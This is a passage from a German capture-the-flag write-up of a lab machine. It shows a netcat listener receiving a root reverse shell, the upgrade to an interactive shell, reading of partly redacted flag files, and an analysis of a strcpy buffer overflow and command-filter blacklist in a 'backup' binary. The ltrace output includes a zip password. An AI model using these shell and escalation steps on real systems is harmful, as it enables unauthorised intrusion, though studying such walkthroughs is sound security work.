tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
```

```shell
nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.52] from (UNKNOWN) [10.10.10.58] 55838
whoami
root
python -c "import pty; pty.spawn('/bin/bash')"
root@node:/usr/local/bin# cat /root/root.txt
172#########ZENSIERT#########be0
root@node:/usr/local/bin# cat /home/tom/user.txt
e11#########ZENSIERT#########1b1
## 3\. Buffer Overflow
```

Es wird mehrmals **strcpy** aufgerufen, allerdings wird nicht die Begrenzung überprüft. In der **displayTarget** Funktion tritt dann ein **overflow** und ein **segfault** auf. Damit dies passiert müssen folgende 3 Kriterien erfüllt werden.

1.  Das 1\. muss ungleich **-q** sein, damit das Programm nicht im quiet mode gestartet wird.
2.  Das 2\. Argument muss einen gültigen Key enthalten
3.  Das 3\. Argument enthält einen 508 characters langen String.

```shell
) = nil strchr("arg3", '|') = nil strstr("arg3", "//") = nil strcmp("arg3", "/") = 1 strstr("arg3", "/etc") = nil strcpy(0xffb1c24b, "arg3") = 0xffb1c24b getpid() = 6034 time(0) = 1520597049 clock(0, 0, 0, 0) = 7799 srand(0x4885486b, 0xc864d874, 0x4885486b, 0x804918c) = 0 rand(0, 0, 0, 0) = 0xb41e2b0 sprintf("/tmp/.backup_188867248", "/tmp/.backup_%i", 188867248) = 22 sprintf("/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 > /dev/null", "/usr/bin/zip -r -P magicword %s %s > /dev/null", "/tmp/.backup_188867248", "arg3") = 65 system("/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 > /dev/null" <no return ...> --- SIGCHLD (Child exited) --- <... system resumed> ) = 3072 access("/tmp/.backup_188867248", 0) = -1 remove("/tmp/.backup_188867248") = -1 fclose(0x9881160) = 0 +++ exited (status 0) +++
```

Das 3. Argument gibt also an, von welchem Verzeichnis ( oder welcher Datei ) eine Zip Datei erstellt werden soll. Dafür wird der Befehl **system()** benutzt. Außerdem wird das 3. Argument mit **.. /root ; & ` $ | //** und **/etc** verglichen. Wenn das 3. Argument einen dieser Strings enthält, bekommen wir eine Zip Datei, welche nur ein Trollface enthält.

Vielen Dank für's durchlesen. :)